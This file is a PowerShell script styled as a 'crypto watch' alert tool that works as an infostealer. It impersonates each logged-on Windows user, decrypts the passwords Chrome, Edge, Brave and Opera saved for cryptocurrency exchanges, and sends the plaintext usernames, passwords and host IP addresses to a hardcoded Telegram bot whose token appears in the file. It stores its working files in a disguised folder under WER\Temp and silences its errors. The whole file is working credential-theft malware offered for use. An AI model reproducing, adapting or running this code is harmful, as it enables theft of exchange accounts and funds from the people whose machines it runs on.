#Requires -Version 5.1
# WINRTCS_CRYPTO_WATCH 1.1 - crypto exchange saved-login scan + Telegram ALERT
# Chromium full decrypt (v10/v11 AES-GCM). Firefox: username+URL; password if undecryptable labeled.
# Dedup + 6h throttle. Dedicated bot @NASCryptoBot (crypto_notify.cfg overrides).
param(
    [switch]$Force,
    [string]$WorkDir = '',
    [string]$DomainList = ''
)

# Dedicated crypto alert bot (NOT the RMM/Sight bot). Override via crypto_notify.cfg.
$script:CryptoBotTokenDefault = '8886691406:AAHl7WmCU-hqD94-EiqK4Qs_AbixAOoYi0M'
$script:CryptoChatIdDefault = '7547462070'
$script:CwPubIp = $null
$script:CwLanIp = $null

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

$script:ZD = 'C:\ProgramData\WinRTCS'
$script:WD = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache'
if (-not $WorkDir) {
    if (Test-Path $script:ZD) { $WorkDir = $script:ZD } else { $WorkDir = $script:WD }
}
if (-not (Test-Path $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }

$logPaths = @(
    (Join-Path $WorkDir 'crypto_watch.log'),
    'C:\Users\Public\crypto_watch.log'
)
$seenPath = Join-Path $WorkDir 'crypto_watch.seen'
$lastPath = Join-Path $WorkDir 'crypto_watch.last'
if (-not $DomainList) {
    foreach ($c in @(
            (Join-Path $WorkDir 'crypto_domains.cfg'),
            (Join-Path $script:ZD 'crypto_domains.cfg'),
            (Join-Path $script:WD 'winrtcs_crypto_domains.cfg')
        )) {
        if (Test-Path $c) { $DomainList = $c; break }
    }
}

function L([string]$m) {
    $line = '[{0}] {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m
    foreach ($lp in $logPaths) {
        try { Add-Content -LiteralPath $lp -Value $line -Encoding UTF8 } catch {}
    }
}

# --- throttle ---
if (-not $Force -and (Test-Path $lastPath)) {
    try {
        $age = (Get-Date) - (Get-Item -LiteralPath $lastPath).LastWriteTime
        if ($age.TotalHours -lt 6) {
            L ("skip_throttle hours=" + [math]::Round($age.TotalHours, 2))
            Write-Output 'CRYPTO_WATCH_THROTTLED'
            exit 0
        }
    } catch {}
}

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;
using System.Collections.Generic;

public static class CwNative {
    public const int SQLITE_OPEN_READONLY = 1;
    public const int SQLITE_ROW = 100;
    public const int SQLITE_DONE = 101;

    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_open_v2", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_open_v2(
        [MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr ppDb, int flags, IntPtr zVfs);

    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_close", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_close(IntPtr db);

    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_prepare_v2", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_prepare_v2(IntPtr db,
        [MarshalAs(UnmanagedType.LPStr)] string zSql, int nByte, out IntPtr ppStmt, IntPtr pzTail);

    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_step", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_step(IntPtr stmt);

    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_finalize", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_finalize(IntPtr stmt);

    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_text", CallingConvention=CallingConvention.Cdecl)]
    public static extern IntPtr sqlite3_column_text(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_blob", CallingConvention=CallingConvention.Cdecl)]
    public static extern IntPtr sqlite3_column_blob(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_bytes", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_column_bytes(IntPtr stmt, int iCol);

    [StructLayout(LayoutKind.Sequential)]
    public struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }

    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn, IntPtr ppszDataDescr, IntPtr pOptionalEntropy,
        IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LocalFree(IntPtr hMem);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_IMPERSONATE = 0x0004;
    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;

    public static byte[] DpapiUnprotect(byte[] data) {
        if (data == null || data.Length == 0) return null;
        DATA_BLOB input = new DATA_BLOB();
        DATA_BLOB output = new DATA_BLOB();
        input.pbData = Marshal.AllocHGlobal(data.Length);
        try {
            Marshal.Copy(data, 0, input.pbData, data.Length);
            input.cbData = data.Length;
            if (!CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref output))
                return null;
            byte[] result = new byte[output.cbData];
            Marshal.Copy(output.pbData, result, 0, output.cbData);
            LocalFree(output.pbData);
            return result;
        } finally {
            Marshal.FreeHGlobal(input.pbData);
        }
    }

    public static bool ImpersonatePid(int pid) {
        IntPtr hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_QUERY_INFORMATION, false, pid);
        if (hProc == IntPtr.Zero) return false;
        IntPtr hTok = IntPtr.Zero;
        IntPtr hDup = IntPtr.Zero;
        try {
            if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out hTok)) return false;
            if (!DuplicateTokenEx(hTok, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, IntPtr.Zero, 2, 2, out hDup)) return false;
            return ImpersonateLoggedOnUser(hDup);
        } finally {
            if (hDup != IntPtr.Zero) CloseHandle(hDup);
            if (hTok != IntPtr.Zero) CloseHandle(hTok);
            CloseHandle(hProc);
        }
    }

    public static void Revert() { RevertToSelf(); }

    public static string PtrToStr(IntPtr p) {
        if (p == IntPtr.Zero) return "";
        return Marshal.PtrToStringAnsi(p) ?? "";
    }

    public static byte[] PtrToBytes(IntPtr p, int n) {
        if (p == IntPtr.Zero || n <= 0) return new byte[0];
        byte[] b = new byte[n];
        Marshal.Copy(p, b, 0, n);
        return b;
    }

    // AES-GCM via AesGcm if available (.NET Core / newer), else BCrypt
    public static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] cipherAndTag) {
        if (key == null || nonce == null || cipherAndTag == null || cipherAndTag.Length < 17) return null;
        int tagLen = 16;
        int cipherLen = cipherAndTag.Length - tagLen;
        byte[] cipher = new byte[cipherLen];
        byte[] tag = new byte[tagLen];
        Buffer.BlockCopy(cipherAndTag, 0, cipher, 0, cipherLen);
        Buffer.BlockCopy(cipherAndTag, cipherLen, tag, 0, tagLen);
        try {
            // Reflection: System.Security.Cryptography.AesGcm (PS7 / netcore)
            var t = Type.GetType("System.Security.Cryptography.AesGcm, System.Security.Cryptography.Algorithms");
            if (t == null) t = Type.GetType("System.Security.Cryptography.AesGcm");
            if (t != null) {
                object aes = Activator.CreateInstance(t, new object[] { key });
                byte[] plain = new byte[cipherLen];
                t.GetMethod("Decrypt", new Type[] { typeof(byte[]), typeof(byte[]), typeof(byte[]), typeof(byte[]), typeof(byte[]) })
                    .Invoke(aes, new object[] { nonce, cipher, tag, plain, null });
                return plain;
            }
        } catch { }
        return BCryptAesGcmDecrypt(key, nonce, cipher, tag);
    }

    [DllImport("bcrypt.dll")]
    static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, int dwFlags);
    [DllImport("bcrypt.dll")]
    static extern int BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport("bcrypt.dll")]
    static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport("bcrypt.dll")]
    static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
    [DllImport("bcrypt.dll")]
    static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")]
    static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);

    [StructLayout(LayoutKind.Sequential)]
    struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }

    static byte[] BCryptAesGcmDecrypt(byte[] key, byte[] nonce, byte[] cipher, byte[] tag) {
        IntPtr hAlg = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        IntPtr pNonce = IntPtr.Zero;
        IntPtr pTag = IntPtr.Zero;
        try {
            if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
            byte[] gcm = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            if (BCryptSetProperty(hAlg, "ChainingMode", gcm, gcm.Length, 0) != 0) return null;
            if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;
            pNonce = Marshal.AllocHGlobal(nonce.Length);
            Marshal.Copy(nonce, 0, pNonce, nonce.Length);
            pTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, pTag, tag.Length);
            var info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            info.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
            info.dwInfoVersion = 1;
            info.pbNonce = pNonce;
            info.cbNonce = nonce.Length;
            info.pbTag = pTag;
            info.cbTag = tag.Length;
            byte[] plain = new byte[cipher.Length];
            int outLen;
            int st = BCryptDecrypt(hKey, cipher, cipher.Length, ref info, null, 0, plain, plain.Length, out outLen, 0);
            if (st != 0) return null;
            if (outLen != plain.Length) {
                byte[] trimmed = new byte[outLen];
                Buffer.BlockCopy(plain, 0, trimmed, 0, outLen);
                return trimmed;
            }
            return plain;
        } catch { return null; }
        finally {
            if (pNonce != IntPtr.Zero) Marshal.FreeHGlobal(pNonce);
            if (pTag != IntPtr.Zero) Marshal.FreeHGlobal(pTag);
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
'@ -ErrorAction Stop

function Get-CryptoTgCfg {
    foreach ($p in @(
            (Join-Path $script:ZD 'crypto_notify.cfg'),
            (Join-Path $script:WD 'crypto_notify.cfg'),
            (Join-Path $WorkDir 'crypto_notify.cfg')
        )) {
        if (-not (Test-Path $p)) { continue }
        $cfg = @{}
        Get-Content -LiteralPath $p | ForEach-Object {
            if ($_ -match '^\s*([A-Za-z0-9_]+)\s*=\s*(.*)\s*$') {
                $cfg[$matches[1]] = $matches[2].Trim()
            }
        }
        if ($cfg.BOT_TOKEN -and $cfg.CHAT_ID) {
            L ("crypto_tg_cfg path=$p")
            return $cfg
        }
    }
    return @{
        BOT_TOKEN = $script:CryptoBotTokenDefault
        CHAT_ID   = $script:CryptoChatIdDefault
    }
}

function Get-PublicIp {
    foreach ($u in @('https://api.ipify.org', 'https://ifconfig.me/ip', 'https://icanhazip.com')) {
        try {
            $r = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 6
            $ip = ($r.Content | Out-String).Trim()
            if ($ip -match '^\d{1,3}(\.\d{1,3}){3}$') { return $ip }
        } catch {}
    }
    return 'n/a'
}

function Get-LocalIps {
    try {
        $ips = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -notlike '127.*' -and $_.PrefixOrigin -ne 'WellKnown' } |
            Select-Object -ExpandProperty IPAddress -Unique
        if ($ips) { return ($ips -join ', ') }
    } catch {}
    return 'n/a'
}

function Get-ExchangeLabel([string]$url) {
    try {
        $u = $url
        if ($u -notmatch '^[a-z]+://') { $u = 'https://' + $u }
        $h = ([Uri]$u).Host.ToLowerInvariant()
        $map = @{
            'coinbase.com' = 'Coinbase'; 'pro.coinbase.com' = 'Coinbase Pro'; 'wallet.coinbase.com' = 'Coinbase Wallet'
            'kraken.com' = 'Kraken'; 'binance.com' = 'Binance'; 'binance.us' = 'Binance.US'
            'crypto.com' = 'Crypto.com'; 'gemini.com' = 'Gemini'; 'kucoin.com' = 'KuCoin'
            'okx.com' = 'OKX'; 'bybit.com' = 'Bybit'; 'gate.io' = 'Gate.io'; 'mexc.com' = 'MEXC'
            'blockchain.com' = 'Blockchain.com'; 'robinhood.com' = 'Robinhood'; 'cash.app' = 'Cash App'
        }
        foreach ($k in $map.Keys) {
            if ($h -eq $k -or $h.EndsWith('.' + $k)) { return $map[$k] }
        }
        return $h
    } catch { return 'Unknown' }
}

function _E([int]$cp) { return [string][char]::ConvertFromUtf32($cp) }

function Format-CryptoAlert($f, [string]$pubIp, [string]$lanIp) {
    $ex = Get-ExchangeLabel $f.Origin
    $browserIcon = _E 0x1F310
    if ($f.Browser -match 'Chrome') { $browserIcon = _E 0x1F300 }
    elseif ($f.Browser -match 'Edge') { $browserIcon = _E 0x1F30A }
    elseif ($f.Browser -match 'Brave') { $browserIcon = _E 0x1F981 }
    elseif ($f.Browser -match 'Opera') { $browserIcon = _E 0x1F534 }
    elseif ($f.Browser -match 'Firefox') { $browserIcon = _E 0x1F98A }
    $sep = ([string][char]0x2501) * 20
    $lines = @(
        ((_E 0x1F6A8) + ' <b>CRYPTO CREDENTIAL ALERT</b>'),
        $sep,
        '',
        ((_E 0x1F48E) + ' <b>Exchange:</b>  ' + (EscHtml $ex)),
        ((_E 0x1F517) + ' <b>URL:</b>  <code>' + (EscHtml $f.Origin) + '</code>'),
        '',
        ((_E 0x1F4BB) + ' <b>Host:</b>  <code>' + (EscHtml $env:COMPUTERNAME) + '</code>'),
        ((_E 0x1F464) + ' <b>Windows user:</b>  <code>' + (EscHtml $f.User) + '</code>'),
        ($browserIcon + ' <b>Browser:</b>  <code>' + (EscHtml $f.Browser) + '</code>'),
        '',
        ((_E 0x1F4E7) + ' <b>Username / email:</b>'),
        ('<code>' + (EscHtml $f.Username) + '</code>'),
        '',
        ((_E 0x1F511) + ' <b>Password:</b>'),
        ('<code>' + (EscHtml $f.Password) + '</code>'),
        '',
        ((_E 0x1F30D) + ' <b>Public IP:</b>  <code>' + (EscHtml $pubIp) + '</code>'),
        ((_E 0x1F3E0) + ' <b>LAN IP:</b>  <code>' + (EscHtml $lanIp) + '</code>'),
        ((_E 0x1F550) + ' <b>When:</b>  <code>' + (EscHtml (Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz')) + '</code>'),
        '',
        $sep,
        ((_E 0x1F916) + ' <i>@NASCryptoBot · WinRTCS CryptoWatch</i>')
    )
    $msg = $lines -join "`n"
    if ($msg.Length -gt 3900) { $msg = $msg.Substring(0, 3900) + "`n<i>...truncated</i>" }
    return $msg
}

function Send-TgAlert([string]$text) {
    $cfg = Get-CryptoTgCfg
    if (-not $cfg -or -not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID) { L 'NO_CRYPTO_TG_CFG'; return $false }
    try {
        $payload = @{
            chat_id                  = $cfg.CHAT_ID
            text                     = $text
            parse_mode               = 'HTML'
            disable_web_page_preview = $true
        }
        $json = $payload | ConvertTo-Json -Compress -Depth 5
        $bytes = [Text.Encoding]::UTF8.GetBytes($json)
        Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") `
            -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' | Out-Null
        return $true
    } catch {
        L ('tg_fail ' + $_.Exception.Message)
        return $false
    }
}

function Get-CryptoDomains {
    $d = New-Object 'System.Collections.Generic.List[string]'
    if ($DomainList -and (Test-Path $DomainList)) {
        Get-Content -LiteralPath $DomainList | ForEach-Object {
            $t = $_.Trim().ToLowerInvariant()
            if ($t -and -not $t.StartsWith('#')) { $d.Add($t) }
        }
    }
    if ($d.Count -eq 0) {
        @('coinbase.com', 'kraken.com', 'binance.com', 'binance.us', 'crypto.com', 'gemini.com',
            'kucoin.com', 'okx.com', 'bybit.com', 'gate.io', 'mexc.com', 'blockchain.com') | ForEach-Object { $d.Add($_) }
    }
    return $d
}

function Test-CryptoHost([string]$url, $domains) {
    try {
        $u = $url
        if ($u -notmatch '^[a-z]+://') { $u = 'https://' + $u }
        $uri = [Uri]$u
        $hostName = $uri.Host.ToLowerInvariant()
        foreach ($d in $domains) {
            if ($hostName -eq $d -or $hostName.EndsWith('.' + $d)) { return $true }
        }
    } catch {}
    return $false
}

function Get-SeenSet {
    $s = @{}
    if (Test-Path $seenPath) {
        Get-Content -LiteralPath $seenPath | ForEach-Object {
            $h = $_.Trim()
            if ($h) { $s[$h] = $true }
        }
    }
    return $s
}

function Add-Seen([string]$hash) {
    Add-Content -LiteralPath $seenPath -Value $hash -Encoding ASCII
}

function Get-FindingHash([string]$user, [string]$browser, [string]$origin, [string]$userName, [string]$password) {
    $raw = '{0}|{1}|{2}|{3}|{4}' -f $user, $browser, $origin, $userName, $password
    $sha = [Security.Cryptography.SHA256]::Create()
    $bytes = $sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($raw))
    return ([BitConverter]::ToString($bytes) -replace '-', '').ToLowerInvariant()
}

function EscHtml([string]$s) {
    if ($null -eq $s) { return '' }
    return ($s -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;')
}

function Get-MasterKey([string]$localStatePath) {
    if (-not (Test-Path $localStatePath)) { return $null }
    try {
        $json = Get-Content -LiteralPath $localStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
        $b64 = [string]$json.os_crypt.encrypted_key
        if (-not $b64) { return $null }
        $raw = [Convert]::FromBase64String($b64)
        # strip DPAPI prefix
        if ($raw.Length -lt 10) { return $null }
        $prefix = [Text.Encoding]::ASCII.GetString($raw, 0, 5)
        if ($prefix -ne 'DPAPI') { return $null }
        $enc = New-Object byte[] ($raw.Length - 5)
        [Array]::Copy($raw, 5, $enc, 0, $enc.Length)
        return [CwNative]::DpapiUnprotect($enc)
    } catch { return $null }
}

function Decrypt-ChromePassword([byte[]]$blob, [byte[]]$masterKey) {
    if ($null -eq $blob -or $blob.Length -lt 3) { return $null }
    $prefix = [Text.Encoding]::ASCII.GetString($blob, 0, 3)
    if ($prefix -eq 'v10' -or $prefix -eq 'v11') {
        if ($null -eq $masterKey) { return $null }
        $nonce = New-Object byte[] 12
        [Array]::Copy($blob, 3, $nonce, 0, 12)
        $ct = New-Object byte[] ($blob.Length - 15)
        [Array]::Copy($blob, 15, $ct, 0, $ct.Length)
        $plain = [CwNative]::AesGcmDecrypt($masterKey, $nonce, $ct)
        if ($null -eq $plain) { return $null }
        return [Text.Encoding]::UTF8.GetString($plain)
    }
    # legacy DPAPI
    $plain2 = [CwNative]::DpapiUnprotect($blob)
    if ($null -eq $plain2) { return $null }
    return [Text.Encoding]::UTF8.GetString($plain2)
}

function Get-ExplorerPidForUser([string]$userName) {
    # userName like DESKTOP\bob or bob
    $short = $userName
    if ($short -match '\\([^\\]+)$') { $short = $Matches[1] }
    $procs = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction SilentlyContinue
    foreach ($p in $procs) {
        try {
            $o = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction Stop
            if ($o.User -and ($o.User -eq $short -or $o.User -eq $userName)) {
                return [int]$p.ProcessId
            }
        } catch {}
    }
    return 0
}

function Read-ChromiumLogins([string]$loginDbPath) {
    $rows = @()
    $tmp = Join-Path $env:TEMP ('cw_login_' + [guid]::NewGuid().ToString('N') + '.db')
    try {
        Copy-Item -LiteralPath $loginDbPath -Destination $tmp -Force
        $db = [IntPtr]::Zero
        $rc = [CwNative]::sqlite3_open_v2($tmp, [ref]$db, [CwNative]::SQLITE_OPEN_READONLY, [IntPtr]::Zero)
        if ($rc -ne 0 -or $db -eq [IntPtr]::Zero) { return $rows }
        $stmt = [IntPtr]::Zero
        $sql = 'SELECT origin_url, username_value, password_value FROM logins'
        $rc = [CwNative]::sqlite3_prepare_v2($db, $sql, -1, [ref]$stmt, [IntPtr]::Zero)
        if ($rc -ne 0) {
            [void][CwNative]::sqlite3_close($db)
            return $rows
        }
        while ([CwNative]::sqlite3_step($stmt) -eq [CwNative]::SQLITE_ROW) {
            $origin = [CwNative]::PtrToStr([CwNative]::sqlite3_column_text($stmt, 0))
            $user = [CwNative]::PtrToStr([CwNative]::sqlite3_column_text($stmt, 1))
            $n = [CwNative]::sqlite3_column_bytes($stmt, 2)
            $blob = [CwNative]::PtrToBytes([CwNative]::sqlite3_column_blob($stmt, 2), $n)
            $rows += [pscustomobject]@{ Origin = $origin; Username = $user; Blob = $blob }
        }
        [void][CwNative]::sqlite3_finalize($stmt)
        [void][CwNative]::sqlite3_close($db)
    } catch {
        L ('sqlite_fail ' + $_.Exception.Message)
    } finally {
        Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
    }
    return $rows
}

function Invoke-ChromiumScan($domains, $seen) {
    $browsers = @(
        @{ Name = 'Chrome'; Rel = 'AppData\Local\Google\Chrome\User Data' },
        @{ Name = 'Edge'; Rel = 'AppData\Local\Microsoft\Edge\User Data' },
        @{ Name = 'Brave'; Rel = 'AppData\Local\BraveSoftware\Brave-Browser\User Data' },
        @{ Name = 'Opera'; Rel = 'AppData\Roaming\Opera Software\Opera Stable' }
    )
    $findings = @()
    $userRoots = Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notin @('Public', 'Default', 'Default User', 'All Users') }
    foreach ($ur in $userRoots) {
        $winUser = $ur.Name
        $pidExpl = Get-ExplorerPidForUser $winUser
        $impersonated = $false
        if ($pidExpl -gt 0) {
            $impersonated = [CwNative]::ImpersonatePid($pidExpl)
            if (-not $impersonated) { L ("impersonate_fail user=$winUser pid=$pidExpl") }
        } else {
            L ("skip_offline_user=$winUser")
        }
        try {
            foreach ($b in $browsers) {
                $base = Join-Path $ur.FullName $b.Rel
                if (-not (Test-Path $base)) { continue }
                $localState = Join-Path $base 'Local State'
                # Opera Stable layout: Local State + Login Data in same folder (no Default)
                $profiles = @()
                if (Test-Path (Join-Path $base 'Login Data')) {
                    $profiles += $base
                } else {
                    Get-ChildItem $base -Directory -ErrorAction SilentlyContinue |
                        Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile *' } |
                        ForEach-Object { $profiles += $_.FullName }
                }
                $master = $null
                if ($impersonated -or ($env:USERNAME -eq $winUser)) {
                    $master = Get-MasterKey $localState
                }
                if (-not $master -and -not $impersonated) {
                    # try anyway as current token (may work if same user)
                    $master = Get-MasterKey $localState
                }
                if (-not $master) {
                    L ("no_master browser=$($b.Name) user=$winUser")
                    continue
                }
                foreach ($prof in $profiles) {
                    $loginDb = Join-Path $prof 'Login Data'
                    if (-not (Test-Path $loginDb)) { continue }
                    $rows = Read-ChromiumLogins $loginDb
                    foreach ($r in $rows) {
                        if (-not (Test-CryptoHost $r.Origin $domains)) { continue }
                        $pw = Decrypt-ChromePassword $r.Blob $master
                        if ($null -eq $pw) { $pw = '(decrypt_failed)' }
                        $findings += [pscustomobject]@{
                            User     = $winUser
                            Browser  = $b.Name
                            Origin   = $r.Origin
                            Username = $r.Username
                            Password = $pw
                        }
                    }
                }
            }
        } finally {
            if ($impersonated) { [CwNative]::Revert() }
        }
    }
    return $findings
}

function Invoke-FirefoxScan($domains) {
    $findings = @()
    $userRoots = Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notin @('Public', 'Default', 'Default User', 'All Users') }
    foreach ($ur in $userRoots) {
        $ffRoot = Join-Path $ur.FullName 'AppData\Roaming\Mozilla\Firefox\Profiles'
        if (-not (Test-Path $ffRoot)) { continue }
        Get-ChildItem $ffRoot -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $lj = Join-Path $_.FullName 'logins.json'
            if (-not (Test-Path $lj)) { return }
            try {
                $j = Get-Content -LiteralPath $lj -Raw -Encoding UTF8 | ConvertFrom-Json
                foreach ($login in @($j.logins)) {
                    $origin = [string]$login.hostname
                    if (-not (Test-CryptoHost $origin $domains)) { continue }
                    $userName = [string]$login.encryptedUsername
                    # NSS decrypt not in v1 — surface username field as encrypted blob marker + formSubmitURL
                    $findings += [pscustomobject]@{
                        User     = $ur.Name
                        Browser  = 'Firefox'
                        Origin   = $origin
                        Username = '(firefox_encrypted_user)'
                        Password = '(firefox_undecrypted)'
                    }
                }
            } catch {}
        }
    }
    return $findings
}

# --- main ---
L ('begin host=' + $env:COMPUTERNAME + ' force=' + [bool]$Force)
$domains = Get-CryptoDomains
L ('domains=' + $domains.Count)
$seen = Get-SeenSet
$all = @()
$all += Invoke-ChromiumScan $domains $seen
$all += Invoke-FirefoxScan $domains
L ('hits_raw=' + $all.Count)

$newCount = 0
foreach ($f in $all) {
    $h = Get-FindingHash $f.User $f.Browser $f.Origin $f.Username $f.Password
    if ($seen.ContainsKey($h)) { continue }
    $seen[$h] = $true
    Add-Seen $h
    $newCount++
    if (-not $script:CwPubIp) { $script:CwPubIp = Get-PublicIp }
    if (-not $script:CwLanIp) { $script:CwLanIp = Get-LocalIps }
    $msg = Format-CryptoAlert $f $script:CwPubIp $script:CwLanIp
    $ok = Send-TgAlert $msg
    L ("alert user=$($f.User) browser=$($f.Browser) origin=$($f.Origin) userName=$($f.Username) tg=$ok")
}

Set-Content -LiteralPath $lastPath -Value (Get-Date -Format o) -Encoding ASCII
L ("done new=$newCount total_raw=$($all.Count)")
Write-Output ("CRYPTO_WATCH_DONE new=$newCount")
exit 0
